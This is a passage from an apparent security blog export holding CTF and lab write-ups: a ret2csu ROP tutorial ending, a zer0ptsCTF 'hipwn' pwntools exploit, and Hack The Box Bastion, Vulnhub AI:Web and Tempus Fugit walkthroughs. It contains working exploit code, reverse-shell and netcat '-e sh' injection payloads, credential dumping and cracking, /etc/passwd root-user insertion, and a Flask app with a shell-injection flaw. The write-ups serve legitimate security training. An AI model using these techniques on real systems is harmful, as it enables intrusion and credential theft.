0x0000000000400684 \u0026lt;+84\u0026gt;:\tjne 0x400670 \u0026lt;__libc_csu_init+64\u0026gt; 0x0000000000400686 \u0026lt;+86\u0026gt;:\tadd rsp,0x8 Now, the mov instructions will transfer the contents to registers. Previously, we gave r12 : 0x600e38 which is an address to the _init pointer, here, apparently, rbx was 0 which means [r12 + rbx * 8] will be equal to [0x600e38 + 0 * 8] which will be [0x600e38]. After that rbx is incremented by 0x1 which will make the rbx value 0x1. Then the cmp rbp,rbx, as you remember from the first chain, we provided 0x1 to rbp value, then it will evaluate equally since rbp and rbx both have the value of 0x1, skipping the jne line. After that we have, add rsp, 0x8, we have to pad this instruction by giving 0x0, after that we can give 0x0 to the popped registers as the control flow of program would take care of this.\nPwned #As we are done understanding the payload, it\u0026rsquo;s time to run the final script:-\nNote: I put a breakpoint at execve. This will help us to check the arguments provided to it.\ngef➤ b *execve Breakpoint 1 at 0x7fa7defa0e30: file ../sysdeps/unix/syscall-template.S, line 78. d4mianwayne@oracle:~/pwn1$ python3 xpl.py [*] \u0026#39;/home/d4mianwayne/pwn1/chall\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [*] \u0026#39;/lib/x86_64-linux-gnu/libc-2.27.so\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./chall\u0026#39;: pid 15085 [*] puts@libc : 0x7f09dd95e9c0 [*] libc : 0x7f09dd8de000 [*] \u0026#39;/bin/sh\u0026#39; : 6295888 [*] Paused (press any to continue) Now, we will attach the process, and continue:-\ngef➤ b *execve Breakpoint 1 at 0x7f09dd9c2e30: file ../sysdeps/unix/syscall-template.S, line 78. gef➤ c Continuing. [ Legend: Modified register | Code | Heap | Stack | String ] -- snip -- ───────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;chall\u0026#34;, stopped 0x7f09dd9c2e30 in execve (), reason: BREAKPOINT ─────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x7f09dd9c2e30 → execve() ────────────────────────────────────────────────────────────────────────────────────────────────────────── Breakpoint 1, execve () at ../sysdeps/unix/syscall-template.S:78 78\t../sysdeps/unix/syscall-template.S: No such file or directory. gef➤ x/s $rdi 0x601150:\t\u0026#34;/bin/sh\u0026#34; gef➤ x/x $rdx 0x0:\tCannot access memory at address 0x0 gef➤ x/x $rsi 0x0:\tCannot access memory at address 0x0 Cool, now let\u0026rsquo;s continue the execution:-\ngef➤ c Continuing. process 15085 is executing new program: /bin/dash It seems like we spawned a shell, let\u0026rsquo;s get back to the script:-\nd4mianwayne@oracle:~/pwn1$ python3 xpl.py [*] \u0026#39;/home/d4mianwayne/pwn1/chall\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [*] \u0026#39;/lib/x86_64-linux-gnu/libc-2.27.so\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./chall\u0026#39;: pid 15085 [*] puts@libc : 0x7f09dd95e9c0 [*] libc : 0x7f09dd8de000 [*] \u0026#39;/bin/sh\u0026#39; : 6295888 [*] Paused (press any to continue) [*] Switching to interactive mode $ whoami d4mianwayne $ id uid=1000(d4mianwayne) gid=1000(d4mianwayne) groups=1000(d4mianwayne),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),129(libvirt) $ [*] Interrupted Awesome, we did it. Congratulations, you finally made it to end which means you learned the ret2csu to some extent. I\u0026rsquo;d recommend you try it on yourself and mess around with gdb.\n","date":"13 April 2020","permalink":"/posts/ret2csu/","section":"Posts","summary":"This is an in-depth guide on ret2csu technique. I tried to make this article as much detailed as I could, including references and some binary to practice it with.","title":"ret2csu - A Return Oriented Programming Technique"},{"content":"","date":null,"permalink":"/tags/rop-bof-ret2csu-ctf/","section":"Tags","summary":"","title":"Rop, Bof, Ret2csu, Ctf"},{"content":"","date":null,"permalink":"/tags/rop-pwn-bof-syscall-zer0ctf/","section":"Tags","summary":"","title":"Rop, Pwn, Bof, Syscall, Zer0ctf"},{"content":"Writeup on how I managed to solve hipwn from zer0ptsCTF.\nAnalzying Source Code and Binary #So, we got 2 files in a gzip archive, one which is main.c which is the source code of the binary and chall which is the executable we need to pwn. Let\u0026rsquo;s check it out:-\n#include \u0026lt;stdio.h\u0026gt; int main(void) { char name[0x100]; puts(\u0026#34;What\u0026#39;s your team name?\u0026#34;); gets(name); printf(\u0026#34;Hi, %s. Welcome to zer0pts CTF 2020!\\n\u0026#34;, name); return 0; } Looks simple enough, of course we have gets which means we have a buffer overflow vulnerability which seems obvious. Other than that, nothing is really much of a concern. Let\u0026rsquo;s run file and check the output:-\nrobin@oracle:~/CTFs$ file chall chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped Damn, it is statically linked which means that all the libc functions which are used in the binary i.e. puts, printf, gets etc. are embedded in the binary itself and it is stripped which means no debugging symbols. Let\u0026rsquo;s see the binary and run the checksec to see what protections it has:-\nrobin@oracle:~/CTFs$ checksec chall [*] \u0026#39;/home/robin/CTFs/chall\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) If it was dynamically linked binary we could have done something like leak any GOT address and then calculate the offsets to do something like system(\u0026quot;/bin/sh\u0026quot;). But since it is statically linked it is pointless approach, we gotta use stuffs which are available in binary itself.\nReverse Engineering the Binary #Time to reverse enginneer the binary so that we could get the address of some useful functions. Let\u0026rsquo;s check out the main function:-\n__int64 sub_400160() { __int64 v1; // [rsp+0h] [rbp-108h] sub_40062F(\u0026#34;What\u0026#39;s your team name?\u0026#34;); sub_4004EE(\u0026amp;v1); sub_400591((unsigned __int64)\u0026#34;Hi, %s. Welcome to zer0pts CTF 2020!\\n\u0026#34;); return 0LL; } There we go, from source code we know the following things:-\nputs(\u0026quot;What's your team name?\u0026quot;) : sub_40062F(\u0026quot;What's your team name?\u0026quot;) gets(name) : sub_4004EE(\u0026amp;v1) printf(\u0026quot;Hi, %s. Welcome to zer0pts CTF 2020!\\n\u0026quot;, name) :sub_400591((unsigned __int64)\u0026quot;Hi, %s. Welcome to zer0pts CTF 2020!\\n\u0026quot;) So, now we know that 0x4004EE is the address of the gets and 0x40062F is the address of puts and 0x400591 is the address of the printf, let\u0026rsquo;s keep this thing in mind and time to pwn it.\nPwning Time #So, my initial step was to use any address from bss to store thw address of /bin/sh and after that make a exceve syscall to spawn a shell. I used pwntools to automate most of the parts like getting the bss address and incrementing it by 0x200 offsets so that the initial address wom\u0026rsquo;t be overwritten as bss loads IO related informations. Let\u0026rsquo;s get it done:-\nFinding offsets #Finding the offset with gdb-gef\u0026rsquo;s de-brujin based pattern search:-\ngef➤ pattern create 300 [+] Generating a pattern of 300 bytes aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa [+] Saved as \u0026#39;$_gef1\u0026#39; gef➤ r Starting program: /home/robin/CTFs/chall What\u0026#39;s your team name? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa Hi, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa. Welcome to zer0pts CTF 2020! Program received signal SIGSEGV, Segmentation fault. [ Legend: Modified register | Code | Heap | Stack | String ] ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x0 $rbx : 0x6261616161616168 (\u0026#34;haaaaaab\u0026#34;?) $rcx : 0x0 $rdx : 0xffffffff $rsp : 0x00007fffffffddf8 → \u0026#34;iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa\u0026#34; $rbp : 0x00007fffffffde38 → 0x00007fffffffe1e1 → \u0026#34;/home/robin/CTFs/chall\u0026#34; $rsi : 0x0000000000402efd → add BYTE PTR [rax], al $rdi : 0x0000000000604688 → \u0026#34;Hi, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaa[...]\u0026#34; $rip : 0x000000000040019c → ret $r8 : 0x2000 $r9 : 0x12c $r10 : 0x8080808080808080 $r11 : 0x202 $r12 : 0x0000000000400160 → push rbx $r13 : 0x00007fffffffde48 → 0x00007fffffffe1f8 → \u0026#34;CLUTTER_IM_MODULE=xim\u0026#34; $r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffddf8│+0x0000: \u0026#34;iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa\u0026#34;\t← $rsp 0x00007fffffffde00│+0x0008: \u0026#34;jaaaaaabkaaaaaablaaaaaabmaaa\u0026#34; 0x00007fffffffde08│+0x0010: \u0026#34;kaaaaaablaaaaaabmaaa\u0026#34; 0x00007fffffffde10│+0x0018: \u0026#34;laaaaaabmaaa\u0026#34; 0x00007fffffffde18│+0x0020: 0x000000006161616d (\u0026#34;maaa\u0026#34;?) 0x00007fffffffde20│+0x0028: 0x0000000000000000 0x00007fffffffde28│+0x0030: 0x00000000004001b3 → lea rdx, [rdi+0x8] 0x00007fffffffde30│+0x0038: 0x0000000000000001 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x400192 add rsp, 0x100 0x400199 xor eax, eax 0x40019b pop rbx → 0x40019c ret [!] Cannot disassemble from $PC ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;chall\u0026#34;, stopped 0x40019c in ?? (), reason: SIGSEGV ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x40019c → ret ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x000000000040019c in ?? () gef➤ x/xg $rsp 0x7fffffffddf8:\t0x6261616161616169 gef➤ pattern search 0x6261616161616169 [+] Searching \u0026#39;0x6261616161616169\u0026#39; [+] Found at offset 264 (little-endian search) likely Adding it to exploit:-\npayload = \u0026#34;A\u0026#34;*264 Using gets to store /bin/sh adddress #This one does gets(writeable_addr) as in 64 bit binaries rdi has first arguments.\npayload += p64(pop_rdi) payload += p64(writable_readable_addr) payload += p64(0x4004EE) # We know the `gets` address from RE part Doing a execve syscall #Since we have found offsets and chained the rop chain to store /bin/sh in bss address, time to do a execve syscall:-\npayload += p64(pop_rax) # This one holds the number of which syscall has to done payload += p64(0x3b) # This ensures `rax` contains `0x3b` which means it is doing an `execve` payload += p64(pop_rdi) # Popping `rdi` address payload += p64(writable_readable_addr) # writeable address which has `/bin/sh` is loaded to `rdi` payload += p64(pop_rsi) # Popping `rsi` and `r15` payload += p64(0) # Loading `0` to `rsi` payload += p64(0) # Loading `0` to `r15` payload += p64(pop_rdx) # Popping rdx payload += p64(0) # We will load to `0` to `rdx` payload += p64(syscall) # Adding `syscall; ret;` at last to request syscall We are doing execve(\u0026quot;/bin/sh\u0026quot;, 0, 0) to spawn a shell.\nFinal Exploit #Here is the final exploit:-\nfrom pwn import * pop_rdi = 0x000000000040141c # pop rdu; ret; pop_rdx = 0x00000000004023f5 # pop rdx; ret; pop_rsi = 0x000000000040141a # pop rsi; pop r15; ret; pop_rax = 0x0000000000400121 # pop rax; ret; syscall = 0x00000000004024dd # syscall; ret; elf = ELF(\u0026#34;./chall\u0026#34;) writable_readable_addr = elf.bss() + 0x200 payload = b\u0026#34;A\u0026#34;*264 payload += p64(pop_rdi) payload += p64(writable_readable_addr) payload += p64(0x4004EE) payload += p64(pop_rdi) payload += p64(writable_readable_addr) payload += p64(0x40062F) payload += p64(pop_rax) payload += p64(0x3b) payload += p64(pop_rdi) payload += p64(writable_readable_addr) payload += p64(pop_rsi) payload += p64(0) payload += p64(0) payload += p64(pop_rdx) payload += p64(0) payload += p64(syscall) #p = process(\u0026#34;./chall\u0026#34;) p = connect(\u0026#34;18.179.178.246\u0026#34;, 9010) p.sendlineafter(\u0026#34;?\\n\u0026#34;, payload) p.sendline(b\u0026#34;/bin/sh\\x00\u0026#34;) # Sending this to stdin which means the `writable_readable_addr` will have `/bin/sh` p.interactive() Running the exploit:-\nrobin@oracle:~/CTFs$ python hipwn_xpl.py [*] \u0026#39;/home/robin/CTFs/chall\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to 18.179.178.246 on port 9010: Done [*] Switching to interactive mode $ ls chall flag.txt redir.sh $ cat flag.txt zer0pts{welcome_yokoso_osooseyo_huanying_dobropozhalovat} $ Yay, we got this. I hope you learned something. Encontered any issues? Contact @D4mianWayne\n","date":"9 March 2020","permalink":"/posts/zer0pts-hipwn/","section":"Posts","summary":"Writeup on how I managed to solve hipwn from zer0ptsCTF.\nAnalzying Source Code and Binary #So, we got 2 files in a gzip archive, one which is main.","title":"zer0ptsCTF - Hipwn Challenge"},{"content":"Write-up for Bastion from hackthebox.eu\nNmap #Starting off with nmap we use nmap -sV -sC -A 10.10.10.134 shows 22, 139, 445, 135 are open. Basically, we gonna use smbclient for further enumeration.\nSMB Service Enumeration #Using smbclient -L //10.10.10.134 shows there are 4 folders on the network drive. Again, using smbclinet for that result in error for every folder excepyt Backups.\nUsing, smbclient //10.10.10.134/Backups -U root we can access the files which typically contains notes.txt , nmap-test-file , SDTC56B and a folder named WindowsImageBackup.\nChecking Files #The file named notes.txt has following contents:-\nSysadmins: please don\u0026rsquo;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.\nMounting the Shared Drive\u0026rsquo;s Folder #Since we want to take a closer look in it Backups folder, the best way to do that is to mount that drive via inbuilt mount program. Using mount -t cifs //10.10.10.134/Backups -o user=guest,password= /tmp/mnt we can mount the drive it took sometime since the network was slow.\nMounting the .vhd files #Looking for files in Backups shows that there was a .vhd file, since as previously suggested in notes.txt we not gonna get the whole .vhd file instead of that we will mount it using guestmount package tool. Using guestmount --add /mnt/backups/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd we ca succesfully mount the vhd file for further enumeration. Network was kinda slow it took ~15 minutes.\nSSH Password Recovery and SSH Login #There were a lot of .xml files but as we do in linux machine enumeration we head over to System32/config and using one of the known tools for dumping the password is samdump2and with samdump2 SYSTEM SAM we can dump the passwords aka NTLM hash of users password.\nSince we got the NTLM hash, usinh Hashkiller we found the hash value that is buraeulampje.\n26112010952d963c8dc4217daec986d9 bureaulampje\nUsing above password for user L4mpje we successfully logged into the machine.\nUser Flag and Root Password #Though, I spent quite a few time in finding user flag thrn I used dir /s *user.txt*, I saw the password is in /L4mpje/Desktop, hence we obtain the user flag.\nTime to enumerate for root, I saw mRemoteNG and speaking of it, mRemoteng stores user\u0026rsquo;s password in a config file so time to get it.\nSo, I went to L4mpje/AppData/mRemoteng to et the config.ini we can see administartor password looks base64 encoded encrypted data. After obtaining that ciphertext I started searching for tools for cracking that ciphertext. Lckly, I found a github repo with mremoteng-decrypt, using the python file and python3 mremoteng-decrypt -s \u0026lt;hash\u0026gt; we can get the password of Administrator i.e. thXLHM96BeKL0ER2.\nAfter that I tried rnas /users:Administrator CMD.exe but it didn\u0026rsquo;t worked so I tried ssh again and we were logged in as Administrator in the machine. So going to Users/Administrator/Desktop we obtained our root.txt.\n","date":"10 September 2019","permalink":"/posts/bastion/","section":"Posts","summary":"Write-up for Bastion from hackthebox.eu\nNmap #Starting off with nmap we use nmap -sV -sC -A 10.10.10.134 shows 22, 139, 445, 135 are open. Basically, we gonna use smbclient for further enumeration.","title":"Hack The Box - Bastion"},{"content":"","date":null,"permalink":"/tags/windows-htb/","section":"Tags","summary":"","title":"Windows, Htb"},{"content":"","date":null,"permalink":"/tags/nmap-ctf-vulnhub/","section":"Tags","summary":"","title":"Nmap, Ctf, Vulnhub"},{"content":"","date":null,"permalink":"/categories/vulnhub/","section":"Categories","summary":"","title":"Vulnhub"},{"content":"This is a writeup for AI:Web by arif from Vulnhub.\nNmap #Starting off with the nmap and using nmap -sV -sC -A -p- -T4 192.168.43.135, we can see that it has only one port open i.e. HTTP or 80.\nHTTP Enumeration #Checking the HTTP port, we can see that it has a very basic homepage.\nNow, from the nmap scan we knew that it has a robots.txt, let\u0026rsquo;s check it.\nrobots.txt had following contents:-\nUser-agent: * Disallow: Disallow: /m3diNf0/ Disallow: /se3reTdir777/uploads/ Now, let\u0026rsquo;s try the /m3diNf0 directory but apparently both of them gave the same response You do not have the permission to view this.\nNow, using uniscan I found that there is a info.php but it was not useful since, since it only contains some basic information, but still what worthy of attenton was the following line:-\nGoing over /se3reTdir777 shows a input for to retrieve the data/credentials by entering the ID.\nSince after entering something like ' 0R 1=1 didn\u0026rsquo;t worked as I thought it was SQLi, then I tried 1,2,3,4.... that leaked the admin, ID and other data.\nSQL Injection and Reverse Shell #I tried to use sqlmap, but the url didn\u0026rsquo;t had any vulnerable parameter so we needed the whole request to attack the database. Thanks to mzfr for pointing it out. I captured the request and saved it in a file and used sqlmap -r new.txt --dbs and started it.\nPOST /se3reTdir777/ HTTP/1.1 Host: 192.168.43.135 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 38 Connection: close Referer: http://192.168.43.135/se3reTdir777/ Upgrade-Insecure-Requests: 1 uid=1%2C2%2C3%2C4....\u0026amp;Operation=Submit Once the scan will over, we can see it has two databases\nChecking the tables and thier respective columns gave some data, though they were kinda useless in our condition since there was no other port beside 80.\nNow, as for now I was a little clueless since we successfully exploited the SQL Injection vulnerabilty, so I tried --os-shell argument to spawn an instance of the shell. That worked, now we knew that it is work on PHP, selecting php as an option and the bruteforce option, after that entering the root directory we found on earlier HTTP Enumeration.\nSo, there are already uploaded files in the folder let\u0026rsquo;s try to access files, apparently one given a blank page, from other we can see an upload service:-\nAs a php backend website, I quickly used the classic old reverse shell script and uploaded it, once it was uploaded, we started the listener and go to /uploads/shell.php start the daemon service to reverse callback the shell file spawning a shell.\nNote: Do `python -c \u0026lsquo;import pty; pty.spawn(\u0026quot;/bin/bash)\u0026rsquo; to spawn a TTY shell.\nUpload file contents #One file has contents which can be seen and deduce that it is upload service.\nRoot #Now, I started searching for SUID binaries but nothing, so I started searching for writable files and directory by using find / -user www-data -writable f 2\u0026gt;/dev/null, which showed us that user www-data has write permission on /etc/passwd.\nRecalling what we have done to MinUV2 from Vulnhub, let\u0026rsquo;s add a sudo user to the file, doing this echo \u0026quot;robin:sXuCKi7k3Xh/s:0:0::/root:/bin/bash\u0026quot; \u0026gt;\u0026gt; /etc/passwd which has a password toor :P\necho \u0026#34;robin:sXuCKi7k3Xh/s:0:0::/root:/bin/bash\u0026#34; \u0026gt;\u0026gt; /etc/passwd su robin toor Rooted, time for a flag:-\nLeaked Username and Passwords #Though only one user credentials were correct from systemUser database that was leaked from it which was aiweb1pwn though that user didn\u0026rsquo;t have any seen vulnerable configuration so that\u0026rsquo;s why we had to do this from user www-data.\n","date":"27 August 2019","permalink":"/posts/ai/","section":"Posts","summary":"This is a writeup for AI:Web from Vulnhub.","title":"Vulnhub - AI: Web"},{"content":"Writeup for Tempus Fugit by 4ndr34z and DCUA7.\nForeword #This machine had a internal network/machine that was our real target and it teaches you about how reconnaisance can often lead you to the vulnerable machine in a network.\nNmap #Starting off with nmap, scanning with nmap -sV -sC -A -p- 192.168.43.224 which shows that we have only one port open i.e. 80 aka HTTP. So, let\u0026rsquo;s check it.\nHTTP Enumeration #Going to the HTTP port gives a good looking UI having a upload feature which will be saved to their internal FTP network of the machine. Now, let\u0026rsquo;s try to upload something which might lead us to something nasty. But as a sanity check I tried to upload .php file but it only accepts rtf and txt files, since it wasn\u0026rsquo;t a windows machine any kind of rtf related exploit would be pointless. Next I tried to intercept the traffic via Burp Suite, now as we can see the contents which was being rendered and the file name field, so as a sanity check again, I added file.txt;ls to check it\u0026rsquo;s listing the files from that folder or not, at this point DCAU7 helped me. So, it was possible to do a command injection from the file field parameter, the command nc \u0026lt; hexencodedIP port -e sh\u0026gt; pointed out by the DCAU7, probably WAF was preventing the standdard IP from being executed in the same order it was supposed to.\nStarting the listener and executing that payload of ours, landed a reverse shell.\nFirst Network and FTP Enumeration #The real fun started from here. We gained the shell as the root user on the alpine linux.\nYup, we are done. Successfully pwned Tempus Fugit, pretty easy, right? Hold your horses, let\u0026rsquo;s see what flag got for us, going to the /root folder which has a file named message.txt which say\nYou\u0026rsquo;re not done yet! :-)\nSo, we are not done, knew something was fishy. So, let\u0026rsquo;s enumerate the system. On the folder where our reverse shell landed us, it had a main.py which had following contents:-\nRemember when we were told that it has a internal FTP server which was storing our uploaded files, from which I knew that we have to gain access to that FTP server, using nsftp which was the FTP package of Alpine, so using that the crdentials from the following script script\nimport os import urllib.request from flask import Flask, flash, request, redirect, render_template from ftplib import FTP import subprocess UPLOAD_FOLDER = \u0026#39;upload\u0026#39; ALLOWED_EXTENSIONS = {\u0026#39;txt\u0026#39;, \u0026#39;rtf\u0026#39;} app = Flask(__name__) app.secret_key = \u0026#34;mofosecret\u0026#34; app.config[\u0026#39;MAX_CONTENT_LENGTH\u0026#39;] = 2 * 1024 * 1024 @app.route(\u0026#39;/\u0026#39;, defaults={\u0026#39;path\u0026#39;: \u0026#39;\u0026#39;}) @app.route(\u0026#39;/\u0026lt;path:path\u0026gt;\u0026#39;) def catch_all(path): cmd = \u0026#39;fortune -o\u0026#39; result = subprocess.check_output(cmd, shell=True) return \u0026#34;\u0026lt;h1\u0026gt;400 - Sorry. I didn\u0026#39;t find what you where looking for.\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;Maybe this will cheer you up:\u0026lt;/h2\u0026gt;\u0026lt;h3\u0026gt;\u0026#34;+result.decode(\u0026#34;utf-8\u0026#34;)+\u0026#34;\u0026lt;/h3\u0026gt;\u0026#34; @app.errorhandler(500) def internal_error(error): return \u0026#34;\u0026lt;h1\u0026gt;500?! - What are you trying to do here?!\u0026lt;/h1\u0026gt;\u0026#34; @app.route(\u0026#39;/\u0026#39;) def home(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/upload\u0026#39;) def upload_form(): try: return render_template(\u0026#39;my-form.html\u0026#39;) except Exception as e: return render_template(\u0026#34;500.html\u0026#34;, error = str(e)) def allowed_file(filename): check = filename.rsplit(\u0026#39;.\u0026#39;, 1)[1].lower() check = check[:3] in ALLOWED_EXTENSIONS return check @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def upload_file(): if request.method == \u0026#39;POST\u0026#39;: if \u0026#39;file\u0026#39; not in request.files: flash(\u0026#39;No file part\u0026#39;) return redirect(request.url) file = request.files[\u0026#39;file\u0026#39;] if file.filename == \u0026#39;\u0026#39;: flash(\u0026#39;No file selected for uploading\u0026#39;) return redirect(request.url) if file.filename and allowed_file(file.filename): filename = file.filename file.save(os.path.join(UPLOAD_FOLDER, filename)) cmd=\u0026#34;cat \u0026#34;+UPLOAD_FOLDER+\u0026#34;/\u0026#34;+filename result = subprocess.check_output(cmd, shell=True) flash(result.decode(\u0026#34;utf-8\u0026#34;)) flash(\u0026#39;File successfully uploaded\u0026#39;) try: ftp = FTP(\u0026#39;ftp.mofo.pwn\u0026#39;) ftp.login(\u0026#39;someuser\u0026#39;, \u0026#39;b232a4da4c104798be4613ab76d26efda1a04606\u0026#39;) with open(UPLOAD_FOLDER+\u0026#34;/\u0026#34;+filename, \u0026#39;rb\u0026#39;) as f: ftp.storlines(\u0026#39;STOR %s\u0026#39; % filename, f) ftp.quit() except: flash(\u0026#34;Cannot connect to FTP-server\u0026#34;) return redirect(\u0026#39;/upload\u0026#39;) else: flash(\u0026#39;Allowed file types are txt and rtf\u0026#39;) return redirect(request.url) if __name__ == \u0026#34;__main__\u0026#34;: app.run() Using the credentials we logged into the FTP server, and retrieved a file named cmscreds.txt which had crdentials for a Content Management Service, at this point I was so clueless since the directory traversal or forced directory search wasn\u0026rsquo;t working with gobuster, uniscan and others.\nbash-4.4# cat cmscreds.txt cat cmscreds.txt Admin-password for our new CMS hardEnough4u I asked for some nudges from mzfr and DCUA, both of them told me about the internal network the machine has, having one of them as a target which we wanted to attack. Now, I checked the /root folder which has some files and other stuff and one of the files has some logs having a IP address 172.19.0.12 which could be the network we want to attack.\nBut again I\u0026rsquo;m clueless, so I asked 4ndr34z who told me to check /etc/resolv.conf which had an entry for mofo.pwn which has to be enumertaed. I ran dig mofo.pwn axfr which showed me an interesting subdomain named ourcms.mofo.pwn on IP 172.19.0.1 which was my best bet of that time.\nbash-4.4# apk fetch nmap apk fetch nmap Downloading nmap-7.60-r2 apk fetch nmap bash-4.4# apk add nmap-7.60-r2.apk apk add nmap-7.60-r2.apk (1/1) Installing nmap (7.60-r2) Executing busybox-1.27.2-r11.trigger OK: 160 MiB in 81 packages Warning: The dig package was not installed on the machine, use apk add bind-tools to get the dig package.\nStable Shell and Port Forwarding #As mzfr told me that I might needed a stable shell to progress more, I used the metasploit\u0026rsquo;s meterpreter shell in order to get the stable shell. For that, I first created a shell.elf with metasploit so we will create a callback from the shell to the meterpreter shell. I used a linux/x86/reverse_tcp in order to create a shell.\nNow, let\u0026rsquo;s get connect to the meterpreter shell:-\nFirst we need to configure to the reverse shell payload to linux/x86/reverse_tcp and set the required options i.e. LHOST and LPORT to their values. Then we need to transfer that shell.elf we have created earlier via HTTP port, use python -m SimpleHTTPServer 1337 in the directory where shell.elf is. Now, once you get the shell.elf via wget, execute it but beforehand kill the nginx server from running processes via kill \u0026lt; pid \u0026gt; so that port fowarding could be done. Now, run the metasploit multi handler exploit to connect back to reverse shell. Once, connected it\u0026rsquo;s time to use the metasploit\u0026rsquo;s portfwd utility to forward the services running on ourcms.mofo.pwn to the other port of our hosts. Run portfwd add -l 8080 -p 8080 -r 172.19.0.1 since, ourcms.mofo.pwn resides to the IP 172.19.0.1, it\u0026rsquo;ll bound the services to the host and service at port 8080.\nWarning: Edit the /etc/hosts and add ourcms.mofo.pwn to the localhost, use http://ourcms.mofo.pwn:port to access the services.\nError: Port is in use #This might be a troubesome if you did the previous steps and messed up a little like I did. Instead of using 8080 as the port, use any other which will work, though this can be a little tiresome at some point but it\u0026rsquo;ll do the work since we\u0026rsquo;ve just stumbled upon the machine we wanted to attack.\nContent Managemnt Service and Reverse Shell #Now, we can access the services, let\u0026rsquo;s log into the CMS already, going to the /admin route, we can sccess the admin panel, recalling what we got from the very first FTP server the credentials which was admin:hardEnough4u and we are logged in. As we are the admin, we can edit, create and do whatever we want to do to server. Now, edit the themes with pentestmonkey\u0026rsquo;s PHP reverse shell and enter the content of it in themes, use the URL specified at the top of the editor and stat the listener to connect to the shell.\nOnce connected to the shell, I did some basic enumeration but somehow there wasn\u0026rsquo;t any clue to leverage and we had lots of user. With some little help I used the wireshark and the Responder tool to get the password of the another user. Just start the wireshark and start the responder in the background and continue enumerating your machine. After 5 minutes or so, I saw the responder output and it had the credentials for gerianne and password barbie.\nUsing those credentials, I leveraged upto user gerianne.\nWhile I was eumerating the machine I found that there was a email in /var/mail for user gerianne. Now, since we have access to it, let\u0026rsquo;s see what it has:\nUser merry has given us the password via mail, which was merry:9a4lw0r82mj8 now we can leverage upto the user merry. Let\u0026rsquo;s get to the root now, probably?\nUser Flag #As user gerianne, I found the user flag in it\u0026rsquo;s home directory.\nRoot #As usual, trying sudo -l showed that I can use cpulimit binary as sudo.\nGoing over gtfobins I found that doing sudo cpulimit -l 100 -f /bin/sh made us root.\n","date":"26 August 2019","permalink":"/posts/tempus-fugit/","section":"Posts","summary":"Writeup for Tempus Fugit by 4ndr34z and DCUA7.\nForeword #This machine had a internal 